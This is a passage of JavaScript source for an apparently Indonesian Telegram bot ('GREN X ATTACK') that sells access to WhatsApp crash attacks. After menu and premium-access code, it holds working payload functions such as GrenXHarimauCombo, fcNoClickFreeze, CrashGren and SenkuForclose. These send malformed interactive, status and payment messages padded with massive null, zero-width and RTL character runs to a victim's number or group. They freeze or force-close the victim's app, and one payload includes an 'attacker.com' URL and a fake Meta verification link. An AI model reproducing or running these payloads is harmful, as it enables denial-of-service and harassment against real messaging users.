          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴀɪʀɪɴɢ : ${botNumber}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//~Runtime🗑️🔧


//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now



function getRandomImage() {
    const images = [
        "https://files.catbox.moe/iht2jc.jpg",
        "https://files.catbox.moe/iht2jc.jpg"
    ];
    return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ Bukan";
  }
}

// Helper function untuk delay

bot.onText(/\/XGren/, async (msg) => {
  // Blokir jika mode onlyGroup aktif dan chat private
  if (onlyGroup && msg.chat.type === "private") {
    return bot.sendMessage(msg.chat.id, "❌ Bot hanya bisa digunakan di grup saat ini.");
  }
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  // ========== EFEK LOADING ==========
  const loadingMsg = await bot.sendMessage(chatId, `⚔️ *MEMPROSES PERINTAH...* ⚔️\n\n▱▱▱▱▱▱▱▱▱▱ 0%`, { parse_mode: "Markdown" });

  const steps = [
    { progress: "▰▱▱▱▱▱▱▱▱▱", percent: 10, text: "Membangkitkan energi..." },
    { progress: "▰▰▱▱▱▱▱▱▱▱", percent: 20, text: "Menyusun senjata..." },
    { progress: "▰▰▰▱▱▱▱▱▱▱", percent: 30, text: "Mengaktifkan sistem..." },
    { progress: "▰▰▰▰▱▱▱▱▱▱", percent: 40, text: "Memuat database..." },
    { progress: "▰▰▰▰▰▱▱▱▱▱", percent: 50, text: "Mengkalibrasi sensor..." },
    { progress: "▰▰▰▰▰▰▱▱▱▱", percent: 60, text: "Menyiapkan serangan..." },
    { progress: "▰▰▰▰▰▰▰▱▱▱", percent: 70, text: "Mengoptimalkan performa..." },
    { progress: "▰▰▰▰▰▰▰▰▱▱", percent: 80, text: "Memeriksa koneksi..." },
    { progress: "▰▰▰▰▰▰▰▰▰▱", percent: 90, text: "Hampir siap..." },
    { progress: "▰▰▰▰▰▰▰▰▰▰", percent: 100, text: "Siap bertempur!" }
  ];

  for (const step of steps) {
    await bot.editMessageText(`⚔️ *MEMPROSES PERINTAH...* ⚔️\n\n${step.progress} ${step.percent}%\n${step.text}`, {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: "Markdown"
    });
    await sleep(200);
  }

  await sleep(300);
  await bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

  // ========== MENU UTAMA ==========
  await bot.sendPhoto(chatId, randomImage, {
    caption: `<pre>
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡

⌑ Developer : @GrenTzy
⌑ Version : 5.3
⌑ Prefix : / ( slash )
⌑ Language : JavaScript

⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡

⌑ Status Premium : ${premiumStatus}
⌑ Username : ${username}
⌑ User Id : ${senderId}
⌑ Runtime : ${runtime}

⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⚡ 𝙏𝙀𝘼𝙈 𝙂𝙍𝙀𝙉 𝙓⚡", callback_data: "thanksto", style: "danger" },
          { text: "👑 𝙊𝙒𝙉𝙀𝙍 𝘼𝙆𝙎𝙀𝙎 👑", callback_data: "akses", style: "danger" }
        ],
        [
          { text: "💀 𝙈𝙀𝙉𝙐 𝙂𝙍𝙀𝙉 𝙓 💀", callback_data: "crash_menu", style: "primary" }
        ],
        [
          { text: "☠️ 𝙄𝙉𝙁𝙊 𝘾𝙍𝙀𝘼𝙏𝙊𝙍 ☠️", url: "https://t.me/GrenTzy", style: "success" }
        ]
      ]
    }
  });
});

// ==================== PAGINATION STATE & DATA ====================
const userPage = new Map();

// ==================== DAFTAR MENU CRASH (SERANGAN) ====================
// ==================== FUNGSI SHOW CRASH MENU ====================
// Pastikan crashList dan ITEMS_PER_PAGE_CRASH sudah didefinisikan
const crashList = [
    { cmd: "/HarimauCombo", desc: "🐯 Harimau combo", example: "/HarimauCombo 628123456789" },
    { cmd: "/fcNoClickFreeze", desc: "❄️ NoClick Freeze", example: "/fcNoClickFreeze 628123456789" },
    { cmd: "/BlankClickGren", desc: "💣 BlankClickGren", example: "/BlankClickGren 628123456789" },
    { cmd: "/Belum ada", desc: "💣 kosong", example: "belum ada 628123456789" }
];
const ITEMS_PER_PAGE_CRASH = 3; // karena hanya 3 item, cukup 1 halaman

async function showCrashMenu(chatId, messageId, randomImage, page) {
    const totalPages = Math.max(1, Math.ceil(crashList.length / ITEMS_PER_PAGE_CRASH));
    // Pastikan page dalam rentang 0 .. totalPages-1
    if (page < 0) page = 0;
    if (page >= totalPages) page = totalPages - 1;

    const start = page * ITEMS_PER_PAGE_CRASH;
    const end = start + ITEMS_PER_PAGE_CRASH;
    const items = crashList.slice(start, end);

    let caption = `<pre>
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
              🔥 GREN X ATTACK 🔥
                   𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯

💀 *COMMAND SERANGAN* 💀
/harimaucombo      🐯 Delay X Freeze
/fcnoclickfreeze   ❄️ NoClick Freeze
/blankclickgren    💣 BlankClickGren
/forceclose        ☠️ ForceClose no click
/delayv1           ⏳ Invisible hard jamin C1 V1
/delayv2           ⏳ Invisible hard jamin C1 V2
/delayv3.          ⏳ Delay duratin bebas spam

📌 *CUSTOM SERANGAN GROUP* 📌
/CrashXGroup       🌐 https:// (target grup)

⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
</pre>`;

    const navButtons = [];
    if (page > 0) navButtons.push({ text: "◀️ SEBELUMNYA", callback_data: "prev_crash" });
    if (page < totalPages - 1) navButtons.push({ text: "BERIKUTNYA ▶️", callback_data: "next_crash" });
    const inlineKeyboard = [
        ...(navButtons.length ? [navButtons] : []),
        [{ text: "🔙 KEMBALI KE MENU", callback_data: "back_to_main" }]
    ];
    const replyMarkup = { inline_keyboard: inlineKeyboard };

    // Simpan halaman
    let userData = userPage.get(chatId) || {};
    userData.crash = page;
    userPage.set(chatId, userData);

    try {
        await bot.editMessageMedia(
            { type: "photo", media: randomImage, caption, parse_mode: "HTML" },
            { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
        );
    } catch (err) {
        console.error("Gagal edit menu crash:", err.message);
    }
}


// Di bagian awal, pastikan userPage sudah didefinisikan (misal Map)
// const userPage = new Map();

// Fungsi untuk menampilkan menu akses dengan pagination
async function showAksesMenu(chatId, messageId, randomImage, page) {
    // Halaman 0: Owner Utama Saja
    // Halaman 1: Semua Owner
    // Halaman 2: Fitur Attack & Lainnya (bisa ditambah)

    let caption = "";
    let replyMarkup = {};

    if (page === 0) {
        caption = `<pre>
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
          🔥 GREN X OWNER MENU 🔥
                 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡

👑 *OWNER UTAMA SAJA* 👑
/restartbot      🔄 Restart bot
/restartpanel    🖥️ Restart panel
/addowner        ➕ Tambah owner
/delowner        ➖ Hapus owner
/cekowner        📋 Daftar owner
/onlygc          🚫 Mode only group
/addbot          ➕ Add sender tunggal
</pre>`;
    } else if (page === 1) {
        caption = `<pre>
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
          🔥 GREN X OWNER MENU 🔥
                 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡

👑 *SEMUA OWNER* 👑
/setpassword     🔒 Set password bot
/delpassword     🔓 Hapus password
/addtoken        📦 Tambah token API
/deltoken        🗑️ Hapus token API
/listakun        📋 Daftar akun (GitHub)
/addakun         ➕ Tambah akun (GitHub)
/delakun         ➖ Hapus akun (GitHub)
/addprem         🌟 Tambah user premium
/delprem         ❌ Hapus user premium
/setjeda         ⏱️ Atur jeda anti spam
/addadmin        👑 Tambah admin

⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
📌 *FITUR LAIN* 📌
/XGren           🚀 Mulai bot
/antrian         ➖ Antrian testfunction
/cekfunc         ➕ Cek function
/addvvip         ➕ Tambah akses role VVIP
/delvvip         ➖ Hapus akses role VVIP
/listvvip        📋 Cek list role VVIP
/addsender       ➕ Add multisender
/delsender       ➖ Delete sender
/listsender      📋 List sender
/usesender       🔄 Use sender
</pre>`;
    }

    // Tombol navigasi
    const navButtons = [];
    if (page > 0) {
        navButtons.push({ text: "◀️ SEBELUMNYA", callback_data: "prev_akses" });
    }
    if (page < 2) {
        navButtons.push({ text: "BERIKUTNYA ▶️", callback_data: "next_akses" });
    }
    const inlineKeyboard = [
        ...(navButtons.length ? [navButtons] : []),
        [{ text: "🔙 KEMBALI KE MENU", callback_data: "back_to_main" }]
    ];

    replyMarkup = { inline_keyboard: inlineKeyboard };

    // Simpan halaman saat ini
    let userData = userPage.get(chatId) || {};
    userData.akses = page;
    userPage.set(chatId, userData);

    try {
        await bot.editMessageMedia(
            { type: "photo", media: randomImage, caption, parse_mode: "HTML" },
            { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
        );
    } catch (err) {
        console.error("Gagal edit menu akses:", err.message);
    }
}



// ==================== MAIN CALLBACK QUERY (DENGAN STYLE) ====================
bot.on("callback_query", async (query) => {
    try {
        const chatId = query.message.chat.id;
        const senderId = query.from.id;
        const messageId = query.message.message_id;
        const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
        const runtime = getBotRuntime();
        const premiumStatus = getPremiumStatus(senderId);
        const randomImage = getRandomImage();

        let caption = "";
        let replyMarkup = {};

        // Menu crash
        if (query.data === "crash_menu") {
            let page = userPage.get(chatId)?.crash || 0;
            await showCrashMenu(chatId, messageId, randomImage, page);
            return bot.answerCallbackQuery(query.id);
        } else if (query.data === "next_crash") {
            let page = (userPage.get(chatId)?.crash || 0) + 1;
            await showCrashMenu(chatId, messageId, randomImage, page);
            return bot.answerCallbackQuery(query.id);
        } else if (query.data === "prev_crash") {
            let page = (userPage.get(chatId)?.crash || 0) - 1;
            await showCrashMenu(chatId, messageId, randomImage, page);
            return bot.answerCallbackQuery(query.id);
        }

        // Menu akses dengan pagination
        else if (query.data === "akses") {
            let page = userPage.get(chatId)?.akses || 0;
            await showAksesMenu(chatId, messageId, randomImage, page);
            return bot.answerCallbackQuery(query.id);
        } else if (query.data === "next_akses") {
            let page = (userPage.get(chatId)?.akses || 0) + 1;
            await showAksesMenu(chatId, messageId, randomImage, page);
            return bot.answerCallbackQuery(query.id);
        } else if (query.data === "prev_akses") {
            let page = (userPage.get(chatId)?.akses || 0) - 1;
            await showAksesMenu(chatId, messageId, randomImage, page);
            return bot.answerCallbackQuery(query.id);
        }

        // Menu thanks (tanpa pagination, langsung dengan <pre>)
        else if (query.data === "thanksto") {
            caption = `<pre>
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
          🙏 TEAM GREN X 🙏
              𝙑𝙀𝙍𝙎𝙄𝙊𝙉 𝟱.𝟯
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡

👑 *CREATOR* 👑
• @GrenTzy (Owner & Developer)

🛠️ *SUPPORTER* 🛠️
• Ajaymelll (Hosting)
• Zamz (Tester)
• Ruxzs R7 (Tester)
• Ucup (Tester)
• Habibi (Hosting)

⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
        Terima kasih atas dukungannya!
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
</pre>`;
            replyMarkup = {
                inline_keyboard: [
                    [{ text: "🔙 KEMBALI KE MENU", callback_data: "back_to_main" }]
                ]
            };
            await bot.editMessageMedia(
                { type: "photo", media: randomImage, caption, parse_mode: "HTML" },
                { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
            );
            return bot.answerCallbackQuery(query.id);
        }

        // Kembali ke menu utama
        else if (query.data === "back_to_main") {
            caption = `<pre>
⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡

⌑ Developer : @GrenTzy
⌑ Version : 5.3
⌑ Prefix : / ( slash )
⌑ Language : JavaScript

⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡

⌑ Status Premium : ${premiumStatus}
⌑ Username : ${username}
⌑ User Id : ${senderId}
⌑ Runtime : ${runtime}

⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡
</pre>`;
            replyMarkup = {
                inline_keyboard: [
                    [
                        { text: "⚡ 𝙏𝙀𝘼𝙈 𝙂𝙍𝙀𝙉 𝙓⚡", callback_data: "thanksto", style: "danger" },
                        { text: "👑 𝙊𝙒𝙉𝙀𝙍 𝘼𝙆𝙎𝙀𝙎 👑", callback_data: "akses", style: "primary" }
                    ],
                    [
                        { text: "💀 𝙈𝙀𝙉𝙐 𝙂𝙍𝙀𝙉 𝙓 💀", callback_data: "crash_menu", style: "success" }
                    ],
                    [
                        { text: "☠️ 𝙄𝙉𝙁𝙊 𝘾𝙍𝙀𝘼𝙏𝙊𝙍 ☠️", url: "https://t.me/GrenTzy", style: "danger" }
                    ]
                ]
            };
            await bot.editMessageMedia(
                { type: "photo", media: randomImage, caption, parse_mode: "HTML" },
                { chat_id: chatId, message_id: messageId, reply_markup: replyMarkup }
            );
            return bot.answerCallbackQuery(query.id);
        }

        // Fallback untuk callback yang tidak dikenali
        await bot.answerCallbackQuery(query.id);
    } catch (error) {
        console.error("Error handling callback query:", error);
        bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan, coba lagi nanti.", show_alert: false });
    }
});

//Tempat function 
async function GrenXHarimauCombo(sock, target) {
  const Gren1 = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Bismillah gacor 🥰",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "cta_url",
            paramsJson: `{"flow_cta":"${"\u0000".repeat(999999) + "\n"}"}`
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "\u800b/\n/\u200b"
          }
        }
      }
    }
  };

  const Gren2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "GrenXHarimauVV5" + "\n".repeat(250000)
          },
          footer: {
            text: "By @GrenTzy"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({ display_text: "OK", url: "https://example.com" })
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, {
    protocolMessage: {
      type: 11,
      contextInfo: {
        forwardingScore: 9741,
        isForwarded: true,
        forwardedAIBotMessageInfo: {
          botName: "MetaAi",
          botJid: ["13135550202@s.whatsapp.net"],
          creatorName: "@GrenTzy"
        }
      }
    }
  }, {
    participant: { jid: target }
  });

  const type = ["call_permission_request", "audio_button", "sticker_button"];

  for (const x of type) {
    const enty = Math.floor(Math.random() * type.length);
    const GrenX = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "GrenXharimauDelay",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_url",
              paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
              url: "https://mmg.whatsapp.net",
              merchantUrl: "t.me/GrenTzy",
              entryPointConversionSource: type[enty],
              version: 3
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            contextInfo: {
              stickerMessage: {
                paymentInviteMessage: {
                  serviceType: 4,
                  expiryTimestamp: Date.now() + 9007199254740991
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, GrenX, {
      participant: { jid: target }
    });
  }

  await sock.relayMessage(target, Gren1, {
    participant: { jid: target }
  });

  await sock.relayMessage(target, Gren2, {
    participant: { jid: target }
  });

  console.log("tutor comboin function");
}

async function fcNoClickFreeze(sock, target) {
    const Gren = {
        interactiveMessage: {
            body: { text: "GrenXHarimauV3" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "\u0000".repeat(20000),
                            sections: [
                                {
                                    title: "\u200b".repeat(15000),
                                    rows: [
                                        {
                                            rowId: "\u600b".repeat(10000),
                                            title: "\u800b".repeat(12000),
                                            description: "\u0000".repeat(8000)
                                        }
                                    ]
                                }
                            ]
                        })
                    },
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u0000".repeat(30000),
                            url: "https://mmg.whatsapp.net" + "\u0000".repeat(20000)
                        })
                    }
                ]
            },
            contextInfo: {
                quotedMessage: {
                    interactiveMessage: {
                        body: { text: "\u200b".repeat(10000) },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "\u0000".repeat(10000)
                                    })
                                }
                            ]
                        }
                    }
                },
                isForwarded: true,
                forwardingScore: 999
            }
        }
    };
    await sock.relayMessage(target, Gren, {});
    console.log("FC no click new x freeze sent");
}

async function BlankClickGren(sock, target) {
    const message = {
        interactiveMessage: {
            header: { title: "GrenTzy" },
            body: { text: "kontol" },
            footer: { text: "tak ada yang paling indah" },
            nativeFlowMessage: {
                buttons: [
                    { 
                        name: "quick_reply", 
                        buttonParamsJson: JSON.stringify({ 
                            display_text: "\u0000".repeat(50000) + "\u0600".repeat(50000), 
                            id: "\u200b".repeat(60000) 
                        }) 
                    }
                ]
            }
        }
    };
    await sock.relayMessage(target, message, {});
}

async function GrenTzy(sock, target) {
  try {
    const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "GrenXHarimauV3",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});
    
    await sock.relayMessage(target, msg.message, {
  requestPaymentMessage: {
    currencyCodeIso4217: "IDR",
    amount1000: "9999",
    requestFrom: target,
    noteMessage: {
      extendedTextMessage: {
        text: msg, 
      }
    },
    expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
    amount: {
      value: 1000,
      offset: 1000,
      currencyCode: 'IDR'
    },
    background: {
      id: '1',
      color1: 0xff075e54,
      color2: 0xff128c7e,
      angle: 45
    },
    paymentStatus: 1,
    expiry: 86400,
    externalPaymentId: "123BCD",
    collectMessage: {
      text: "\u0000"
    },
    interstitial: {
      paymentMethod: true,
      installmentOptions: {
        maxInstallments: 999
      }
    }
  }
}, {
  participant: { jid: target }
});

    console.log(`Allhamdulillah Kekirim${target}`);

  } catch (error) {
    console.error(`Error${error.message}`);
  }
}

async function GrenDelayXharimauV1(sock, target) {
  const type = ["call_permission_request", "audio_button", "sticker_button"];

  for (const x of type) {
    const enty = Math.floor(Math.random() * type.length);
    const GrenX = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "GrenXharimauDelay",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_url",
              paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
              url: "https://mmg.whatsapp.net",
              merchantUrl: "t.me/GrenTzy",
              entryPointConversionSource: type[enty],
              version: 3
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            contextInfo: {
              stickerMessage: {
                paymentInviteMessage: {
                  serviceType: 4,
                  expiryTimestamp: Date.now() + 9007199254740991
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, GrenX, { participant: { jid: target } });
  }

  console.log(`💀 GrenXharimau nih dek hati-hati wa lu gak bisa ngapa-ngapain 💀`);
}

async function GrenDelayHarimau(sock, target) {
    const Gren = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "GrenXharimauDelay",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "cta_url",
                        paramsJson: `{"flow_cta":"${"\u0000".repeat(999999) + "\n"}"}`,
                    },
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "\u200b/\n/\u300b"
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Gren, {});
    console.log("ahhhh terkirim ke target🤧");
}

async function CrashGren(sock, groupJid) {
    const targetJid = groupJid.includes('@') ? groupJid : groupJid + '@g.us';
    const Gren = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Save gue @GrenTzy teman lu"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(60900),
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "GrenTzy Kicau kicau mania",
                                    url: "{\"display_text\":\"ⓘ ⸸GrenTzy\",\"url\":\"http://wa.me/stickerpack/GrenTzy\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,GrenTzy\"}"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{ icon: 'DOKUMENT' }`.repeat(60900)
                            }
                        ]
                    },
                    contextInfo: {
                        quotedMessage: {
                            extendedTextMessage: {
                                text: "ꦾ".repeat(30000) + "@1".repeat(60000),
                                contextInfo: {
                                    stanzaId: targetJid,
                                    participant: targetJid,
                                    mentionedJid: Array.from({ length: 10000 }, () => `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`)
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    
    const Gren2 = {
        interactiveMessage: {
            body: {
                text: "Hello bang"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ꦽ".repeat(150000),
                            phone_number: "00000000000000"
                        })
                    }
                ],
                version: 3
            }
        }
    };
    
    await sock.relayMessage(targetJid, Gren, {});
    await sock.relayMessage(targetJid, Gren2, {});
    console.log(`CrashGren sent to ${targetJid}`);
}

async function SenkuForclose(sock, target) {
    const nul = "\u0000";
    const blank = "\u200B";
    const rtl = "\u202E";
    const overflow = nul.repeat(50000) + blank.repeat(50000) + rtl.repeat(50000);

    const ghostPairingPayload = {
        interactiveMessage: {
            header: { title: "@Meta AI", subtitle: "꦳꧀" },
            body: { text: "ᬼ" },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "ᬼ",
                        url: "https://fake-meta-verify.com/" + overflow.substring(0, 1000)
                    })
                }]
            }
        }
    };

    const mediaCrash = {
        imageMessage: {
            url: "https://attacker.com/crash.png" + "ᬼ" + overflow.substring(0, 3000),
            mimetype: "image/jpeg",
            caption: "ᬼ".repeat(5000) + rtl.repeat(5000),
            jpegThumbnail: Buffer.from("FFD8" + "00".repeat(200000) + "FFD9", "hex"),
            fileLength: 999999999999
        }
    };
    
    const statusTagPayload = {
        statusMessage: {
            text: "ZamsNihBang🤓" + overflow.substring(0, 40000),
            mentions: [target]
        }
    };

    const scansSidecar = {
        async scanMessage(sock, target) {
            const scanId = Date.now();
            console.log(`[SCAN] Sidecar activated for ${target} - ID: ${scanId}`);
            return { scanId, target };
        }
    };

    const embeddedMusic = {
        async sendMusic(sock, target) {
            const musicMessage = {
                extendedTextMessage: {
                    text: `🎵 *FORCLOSE COMBO*\n🔥 Target: ${target}\n💀 Status: INJECTED`,
                    previewType: 2,
                    musicMetadata: {
                        title: "Zams Forclose",
                        artist: "Indictive Core",
                        url: "https://t.me/ZamsLikeCrash",
                        durationSec: 999,
                        albumName: "WhatsApp Exploit"
                    }
                }
            };
            await sock.sendMessage(target, musicMessage);
            console.log(`[MUSIC] Embedded music sent to ${target}`);
        }
    };

    console.log(`🚀 FORCLOSE COMBO to ${target}`);
    
    await scansSidecar.scanMessage(sock, target);
    
    await Promise.all([
        sock.relayMessage(target, ghostPairingPayload, { participant: { jid: target } }),
        sock.relayMessage(target, mediaCrash, { participant: { jid: target } }),
        sock.relayMessage(target, statusTagPayload, { participant: { jid: target } })
    ]);
    
    await embeddedMusic.sendMusic(sock, target);
